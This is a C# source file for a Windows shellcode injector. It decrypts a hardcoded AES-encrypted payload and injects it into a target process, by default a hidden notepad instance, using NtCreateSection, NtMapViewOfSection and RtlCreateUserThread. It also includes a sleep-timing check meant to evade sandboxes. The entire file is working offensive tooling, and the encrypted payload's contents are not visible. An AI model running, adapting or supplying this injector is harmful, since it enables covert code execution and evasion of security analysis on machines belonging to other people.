using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace RFC_ntPInject
{
    public class Program
    {
        #region Win32

        [DllImport("ntdll.dll", SetLastError = true)]
        public static extern uint NtQuerySystemTime(out long SystemTime);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public IntPtr Buffer;
        }

        [DllImport("ntdll.dll")]
        public static extern void RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

        static void InitializeObjectAttributes(ref OBJECT_ATTRIBUTES objAttr, ref UNICODE_STRING name, int attr, IntPtr root, IntPtr secDesc)
        {
            objAttr.Length = Marshal.SizeOf(typeof(OBJECT_ATTRIBUTES));
            objAttr.RootDirectory = root;
            objAttr.ObjectName = IntPtr.Zero;
            objAttr.Attributes = (uint)attr;
            objAttr.SecurityDescriptor = secDesc;
            objAttr.SecurityQualityOfService = IntPtr.Zero;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID ClientId);

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        struct OBJECT_ATTRIBUTES
        {
            public Int32 Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [StructLayout(LayoutKind.Sequential)]
        struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [DllImport("ntdll.dll", SetLastError = true, ExactSpelling = true)]
        static extern UInt32 NtCreateSection(ref IntPtr SectionHandle, UInt32 DesiredAccess, IntPtr ObjectAttributes, ref UInt32 MaximumSize, UInt32 SectionPageProtection, UInt32 AllocationAttributes, IntPtr FileHandle);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, UIntPtr ZeroBits, UIntPtr CommitSize, out ulong SectionOffset, out uint ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern IntPtr RtlCreateUserThread(IntPtr processHandle, IntPtr threadSecurity, bool createSuspended, Int32 stackZeroBits, IntPtr stackReserved, IntPtr stackCommit, IntPtr startAddress, IntPtr parameter, ref IntPtr threadHandle, IntPtr clientId);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF
        }

        public enum DesiredAccess : uint
        {
            SECTION_MAP_READ = 0x0004,
            SECTION_MAP_WRITE = 0x0002,
            SECTION_MAP_EXECUTE = 0x0008,
            PAGE_READ_WRITE = 0x04,
            PAGE_READ_EXECUTE = 0x20,
            PAGE_EXECUTE_READWRITE = 0x40,
            SEC_COMMIT = 0x8000000
        }

        #endregion
        public static void Main(string[] args)
        {
            Console.WriteLine("[*] Sleeping for a bit :)");
            long systemTimeThen = 0;
            long systemTimeNow = 0;
            NtQuerySystemTime(out systemTimeThen);
            Sleep(2000);
            NtQuerySystemTime(out systemTimeNow);
            TimeSpan difference = DateTime.FromFileTime(systemTimeNow) - DateTime.FromFileTime(systemTimeThen);

            if (difference.TotalSeconds < 1.5)
            {
                return;
            }
            else
            {
                if (args.Length == 0 || args[0] == "")
                {
                    Console.WriteLine("[!] No target process supplied! Creating new NotePad process");
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.FileName = "notepad.exe";
                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    Process process = new Process();
                    process.StartInfo = processStartInfo;
                    process.Start();
                    ntPInject("notepad");
                }
                else
                {
                    string TargetProcess = args[0];
                    ntPInject(TargetProcess);
                }
            }
        }

        private static void ntPInject(string TargetProcess)
        {
            Console.WriteLine("[*] Decrypting payload ...");
            #region Encrypted payload

            string key = "ji55znNpvn9oGa9Xudmsvlj4aPQYuSfmpR/97MTC0DU=";
            string iv = "tej5uRk1Mq8vrBv+TXDEbw==";

            string sbuffer = "RYrZ2zx27gW+yrLgixHMf8S4UXBagcaYY26xVeGrfX7thfvf6Xw08Eg4fR0NJPojG+Zr3RHnqCQNBsnDKMZUJPzmjwwRD+8d1OWgEF4kvkRnd6mhrdUpdP58tlrrEyZvtWIUrp8PuYy+d396u2cPDnpIzHZac0xRq2nYojbdepkjMp+Vk/sCLTG+o0X8+yl+pk3UCySa/d8sia2YmFkXVl5pkE6rSZS+PKG9rj2ShmfINs69x1i0Ywfqhurd7XH13aIwmXC4IfMfazCxWK0ZEBXWv96DVpXqUmiT2jYJONP9WHFc4d6+9Rws4qCxuPn4bstuPaWyk1ud+rN95J/SvCCFlYOXioeebOM5HudoYrUSCDSjrf6QtbNtS/dK4s8kIPob/qbhcYqhbgSfZsECgmNo+T+JedN5diO6wlpcoecVT6H/HABBB2c9fwhAaXkEAOrtFOvZvzH5MvK69a68hsOa1+BAITty+LdP/6y5rcnnkF/mdKqagRrE8z+ASu9aLnTr3DMqmigg5v58Kh1YuQ0q/SeFK1O5srQzzA6eBgxf2zJuhJh3zWHwRGtXzF642bvCdGcK56aitKwno7DwnFVhnK8VR4lOP20UAin0m2/EfkFU8/ujPtK/j2Gbg+a/hKz3+x+xxfwtvLThckDwqhtAIWXlhAX5iBt7NUIzAJE=";
            byte[] decryptedBytes;
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = Convert.FromBase64String(key);
                aesAlg.IV = Convert.FromBase64String(iv);
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.Mode = CipherMode.CBC;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                byte[] encryptedBytesArray = Convert.FromBase64String(sbuffer);
                decryptedBytes = decryptor.TransformFinalBlock(encryptedBytesArray, 0, encryptedBytesArray.Length);
            }

            byte[] buffer = decryptedBytes;

            int bufLength = buffer.Length;
            UInt32 ubufLength = (UInt32)bufLength;

            #endregion

            // Getting handle on local process
            IntPtr pLocalProcess = Process.GetCurrentProcess().Handle;
            if (pLocalProcess == IntPtr.Zero)
            {
                Console.WriteLine("[!] Failed to get handle to current process!");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Got handle to current process! 0x{pLocalProcess.ToString("X")}");
            }

            // Getting handle on remote process
            IntPtr pRemoteProcess = IntPtr.Zero;
            UNICODE_STRING name = new UNICODE_STRING();
            RtlInitUnicodeString(ref name, null);
            OBJECT_ATTRIBUTES objAttr = new OBJECT_ATTRIBUTES();
            InitializeObjectAttributes(ref objAttr, ref name, 0, IntPtr.Zero, IntPtr.Zero);
            objAttr.ObjectName = name.Buffer;

            CLIENT_ID clientId = new CLIENT_ID
            {
                UniqueProcess = new IntPtr(Process.GetProcessesByName(TargetProcess)[0].Id),
                UniqueThread = IntPtr.Zero
            };

            NtOpenProcess(ref pRemoteProcess, (uint)ProcessAccessFlags.All, ref objAttr, ref clientId);

            if (pRemoteProcess == IntPtr.Zero)
            {
                Console.WriteLine($"[!] Failed to get handle to {TargetProcess} process!");
                return;
            }
            else
            {
                Console.WriteLine($"[+] Got handle to {TargetProcess} process! 0x{pRemoteProcess.ToString("X")}");
            }

            // Creating new RWX memory section object
            IntPtr sectionHandle = IntPtr.Zero;
            NtCreateSection(ref sectionHandle, (uint)DesiredAccess.SECTION_MAP_READ | (uint)DesiredAccess.SECTION_MAP_WRITE | (uint)DesiredAccess.SECTION_MAP_EXECUTE, IntPtr.Zero, ref ubufLength, (uint)DesiredAccess.PAGE_EXECUTE_READWRITE, (uint)DesiredAccess.SEC_COMMIT, IntPtr.Zero);
            Console.WriteLine($"[i] Creating memory section objects - Handle:{sectionHandle.ToString("X")}");

            // Mapping view of create section into the local process (R-W)
            IntPtr localBaseAddress = IntPtr.Zero;
            ulong localSectionOffset = 0;
            NtMapViewOfSection(sectionHandle, pLocalProcess, ref localBaseAddress, UIntPtr.Zero, UIntPtr.Zero, out localSectionOffset, out ubufLength, 2, 0, (uint)DesiredAccess.PAGE_READ_WRITE);
            Console.WriteLine($"[i] Mapping view of create section into the local process (R-W) - localBaseAddress: {localBaseAddress.ToString("X")}");

            // Mapping view of created section into the remote process (R-E)
            IntPtr remoteBaseAddress = IntPtr.Zero;
            ulong remoteSectionOffset = 0;
            NtMapViewOfSection(sectionHandle, pRemoteProcess, ref remoteBaseAddress, UIntPtr.Zero, UIntPtr.Zero, out remoteSectionOffset, out ubufLength, 2, 0, (uint)DesiredAccess.PAGE_READ_EXECUTE);
            Console.WriteLine($"[i] Mapping view of create section into the remote process (R-E) - remoteBaseAddress: {remoteBaseAddress.ToString("X")}");

            Console.WriteLine($"[i] Copying shellcode into localBaseAddress: {localBaseAddress.ToString("X")}");
            Marshal.Copy(buffer, 0, localBaseAddress, bufLength);

            // Execute remote thread
            IntPtr threadHandle = IntPtr.Zero;
            RtlCreateUserThread(pRemoteProcess, IntPtr.Zero, false, 0, IntPtr.Zero, IntPtr.Zero, remoteBaseAddress, IntPtr.Zero, ref threadHandle, IntPtr.Zero);
            Console.WriteLine("[*] Executed!!");

            // Cleaning up 
            NtUnmapViewOfSection(pLocalProcess, localBaseAddress);
            NtClose(sectionHandle);
        }
    }
}
